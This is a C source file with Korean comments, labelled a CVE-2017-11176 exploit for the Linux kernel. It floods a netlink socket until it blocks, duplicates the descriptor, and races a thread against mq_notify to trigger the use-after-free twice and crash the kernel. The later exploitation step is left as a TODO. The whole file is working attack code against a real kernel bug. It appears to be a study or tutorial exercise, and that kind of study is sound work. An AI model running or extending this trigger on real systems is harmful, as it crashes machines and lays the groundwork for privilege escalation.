#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>

// ============================================================================
// 매크로 선언
// ============================================================================

#define NOTIFY_COOKIE_LEN (32)
#define SOL_NETLINK (270) // from [include/linux/socket.h]

// avoid library wrappers
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(sockfd, level, optname, optval, optlen) \
    syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)
#define _getsockopt(sockfd, level, optname, optval, optlen) \
    syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)
#define _dup(oldfd) syscall(__NR_dup, oldfd)
#define _close(fd) syscall(__NR_close, fd)
#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)

#define PRESS_KEY()                               \
    do                                            \
    {                                             \
        printf("[ ] press key to continue...\n"); \
        getchar();                                \
    } while (0)

// ============================================================================
// 필요한 구조체 선언
// ============================================================================

struct unblock_thread_arg
{
    int sock_fd;
    int unblock_fd;
    bool is_ready; // we can use pthread barrier instead
};

// ============================================================================
// 함수 선언 
// ============================================================================

static void *unblock_thread(void *arg)
{
    struct unblock_thread_arg *uta = (struct unblock_thread_arg *)arg;
    int val = 3535; // need to be different than zero

    // notify the main thread that the unblock thread has been created. It *must*
    // directly call mq_notify().
    uta->is_ready = true;

    sleep(5); // gives some time for the main thread to block

    printf("[ ][unblock] closing %d fd\n", uta->sock_fd);
    _close(uta->sock_fd);

    printf("[ ][unblock] unblocking now\n");
    if (_setsockopt(uta->unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("[+] setsockopt");
    return NULL;
}

static int decrease_sock_refcounter(int sock_fd, int unblock_fd)
{
    pthread_t tid;
    struct sigevent sigev;
    struct unblock_thread_arg uta;
    char sival_buffer[NOTIFY_COOKIE_LEN];

    // initialize the unblock thread arguments
    uta.sock_fd = sock_fd;
    uta.unblock_fd = unblock_fd;
    uta.is_ready = false;

    // initialize the sigevent structure
    memset(&sigev, 0, sizeof(sigev));
    sigev.sigev_notify = SIGEV_THREAD;
    sigev.sigev_value.sival_ptr = sival_buffer;
    sigev.sigev_signo = uta.sock_fd;

    printf("[ ] creating unblock thread...\n");
    if ((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
    {
        perror("[-] pthread_create");
        goto fail;
    }
    while (uta.is_ready == false) // spinlock until thread is created
        ;
    printf("[+] unblocking thread has been created!\n");

    printf("[ ] get ready to block\n");
    if ((_mq_notify((mqd_t)-1, &sigev) != -1) || (errno != EBADF))
    {
        perror("[-] mq_notify");
        goto fail;
    }
    printf("[+] mq_notify succeed\n");

    return 0;

fail:
    return -1;
}

static int prepare_blocking_socket(void)
{
    int send_fd;
    int recv_fd;
    char buf[1024 * 10];
    int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF

    struct sockaddr_nl addr = {
        .nl_family = AF_NETLINK,
        .nl_pad = 0,
        .nl_pid = 118, // must different than zero
        .nl_groups = 0 // no groups
    };

    struct iovec iov = {
        .iov_base = buf,
        .iov_len = sizeof(buf)};

    struct msghdr mhdr = {
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0,
    };

    // sender, receiver 소켓 생성
    printf("[ ] preparing blocking netlink socket\n");
    if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0 ||
        (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0)
    {
        perror("socket");
        goto fail;
    }
    printf("[+] socket created (send_fd = %d, recv_fd = %d)\n", send_fd, recv_fd);

    // receiver 소켓 바인드(포트 번호 부여)
    while (_bind(recv_fd, (struct sockaddr *)&addr, sizeof(addr)))
    {
        if (errno != EADDRINUSE)
        {
            perror("[-] bind");
            goto fail;
        }
        addr.nl_pid++;
    }
    printf("[+] netlink socket bound (nl_pid=%d)\n", addr.nl_pid);

    // receiver 의 버퍼를 줄일수 있는지 시도 (실패해도 됨)
    if (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
        perror("[-] setsockopt"); // no worry if it fails, it is just an optim.
    else
        printf("[+] receive buffer reduced\n");

    // sender 에서 receiver 로 메시지 flooding 시작(버퍼 채우기)
    printf("[ ] flooding socket\n");
    while (_sendmsg(send_fd, &mhdr, MSG_DONTWAIT) > 0)
        ;
    if (errno != EAGAIN)
    {
        perror("[-] sendmsg");
        goto fail;
    }
    printf("[+] flood completed\n");

    _close(send_fd);

    printf("[+] blocking socket ready\n");
    return recv_fd;

fail:
    printf("[-] failed to prepare block socket\n");
    return -1;
}

// ============================================================================
// 메인함수
// ============================================================================

int main(void)
{
    int sock_fd = -1;
    int sock_fd2 = -1;
    int unblock_fd = 1;


    printf("[ ] -={ CVE-2017-11176 Exploit }=-\n");

    // 리시브 버퍼를 채운 Netlink 소켓 준비 
    if ((sock_fd = prepare_blocking_socket()) < 0)
    {
        goto fail;
    }
    else
    {
        printf("[+] netlink socket created = %d\n", sock_fd);
    }

    // Unblock 과 Double Trigger 를 위해 소켓을 Dup 한다 
    if (((unblock_fd = _dup(sock_fd)) < 0) || ((sock_fd2 = _dup(sock_fd)) < 0))
    {
        perror("[-] dup");
        goto fail;
    }
    else
    {
        printf("[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\n", unblock_fd, sock_fd2);
    }


    // 버그를 두번 트리거함 (각 다른 fd)
    if (decrease_sock_refcounter(sock_fd, unblock_fd) ||
        decrease_sock_refcounter(sock_fd2, unblock_fd))
    {
        goto fail;
    }
    else
    {
        printf("[+] trigger bug twice\n");
    }


    printf("[ ] ready to crash?\n");
    PRESS_KEY();

    // TODO: exploit

    return 0;

fail:
    printf("[-] exploit failed!\n");
    PRESS_KEY();
    return -1;
}